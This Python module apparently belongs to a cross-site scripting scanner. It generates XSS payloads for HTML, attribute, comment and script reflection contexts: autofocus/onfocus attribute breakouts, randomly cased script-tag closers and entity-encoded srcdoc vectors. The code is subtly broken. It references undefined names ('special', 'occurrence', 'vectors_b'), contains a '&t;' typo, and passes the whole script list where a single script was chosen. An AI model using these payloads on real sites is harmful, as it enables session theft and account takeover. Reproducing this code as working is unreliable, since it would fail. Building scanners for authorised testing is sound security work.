from collections import defaultdict

from core.jsContexter import jsContexter
from core.utils import randomUpper as r, genGen, extractScripts
from core.config import badTags, fillings, eFillings, lFillings, jFillings, eventHandlers, tags, functions

def htmlContext(occurrence, breaker, special, vector):
    lessBracketEfficiency = occurrence['score']['<']
    greatBracketEfficiency = occurrence['score']['>']
    breakerEfficiency = occurrence['score'][breaker]
    if breaker in ('\'', '"'):
        breaker = ''
        breakerEfficiency = 100
    ends = ['//']
    if greatBracketEfficiency == 100:
        ends.append('>')
    if lessBracketEfficiency == breakerEfficiency == 100:
        payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, breaker, special)
        for payload in payloads:
            vector.add(payload)

def attributeContext(occurrence, breaker, attribute, vector_a, vector_b):
    breakerEfficiency = occurrence['score'][breaker]
    greatBracketEfficiency = occurrence['score']['>']
    ends = ['//']
    if greatBracketEfficiency == 100:
        ends.append('>')
    if greatBracketEfficiency == 100 and breakerEfficiency == 100:
        payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, breaker, special)
        for payload in payloads:
            if breaker:
                payload = payload.replace(breaker, breaker + '>')
            else:
                payload = '>' + payload
            vectors_b.add(payload)
    if breakerEfficiency == 100:
        for filling in fillings:
            for function in functions:
                vector = breaker + filling + 'auTOfOcuS' + filling + 'OnFoCUs' + '=' + breaker + function
                vector_a.add(vector)
    if breakerEfficiency == 90:
        for filling in fillings:
            for function in functions:
                vector = '\\' + breaker + filling + 'auTOfOcuS' + filling + 'OnFoCUs' + '=' + function + filling + '\\' + breaker
                vector_a.add(vector)
    if attribute == 'srcdoc':
        if occurrence['score']['&lt;']:
            if occurrence['score']['&gt;']:
                ends = []
                ends.append('&t;')
            payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, '', '')
            for payload in payloads:
                vector_b.add(payload.replace('<', '&lt;'))
                
def commentContext(occurrence, breaker, special, vector):
    lessBracketEfficiency = occurrence['score']['<']
    greatBracketEfficiency = occurrence['score']['>']
    breakerEfficiency = occurrence['score'][breaker]
    ends = ['//']
    if greatBracketEfficiency == 100:
        ends.append('>')
    if lessBracketEfficiency == breakerEfficiency == 100:
        payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, breaker, special)
        for payload in payloads:
            vector.add(payload)

def scriptContext(script, breaker, vector_a, vector_b, vector_c):
    closer = jsContexter(script)
    validBreakers = ['\'', '"', '`']
    scriptEfficiency = occurrence['score']['</scRipT/>']
    greatBracketEfficiency = occurrence['score']['>']
    breakerEfficiency = occurrence['score'][breaker]
    ends = ['//']
    if greatBracketEfficiency == 100:
        ends.append('>')
    if scriptEfficiency == 100:
        breaker = r('</script/>')
        payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, breaker, special)
        for payload in payloads:
            vector_a.add(payload)
    if closer:
        suffix = '//\\'
        if not breaker:
            closer = closer[1:]
        if breakerEfficiency != 100:
            breaker = ''
        for filling in jFillings:
            for function in functions:
                vector = breaker + closer + filling + function + suffix
                vector_b.add(vector)
    elif breakerEfficiency > 83:
        suffix = '//'
        for filling in jFillings:
            for function in functions:
                if '=' in function:
                    function = '(' + function + ')'
                if breaker == '':
                    filling = ''
                vector = '\\' + breaker + closer + filling + function + suffix
                vector_c.add(vector)
            
def generator(occurrences, response):
    scripts = extractScripts(response)
    index = 0
    vectors = defaultdict(set)
    for occurrence in occurrences:
        context = occurrence['context'][0]
        breaker = occurrence['context'][1]
        special = occurrence['context'][2]
        attribute = occurrence['context'][3]
        if special in badTags and context == 'attribute':
            special = '</' + special + '/>'
        else:
            special = ''
        if context == 'html':
            htmlContext(occurrence, breaker, special, vectors[10])
        elif context == 'attribute':
            attributeContext(occurrence, breaker, attribute, vectors[6], vectors[10])
        elif context == 'comment':
            commentContext(occurrence, breaker, special, vectors[10])
        elif context == 'script' and scripts:
            script = scripts[index] if index < len(scripts) else scripts[0]
            scriptContext(scripts, breaker, vectors[10], vectors[7], vectors[6])
            index += 1
    return vectors
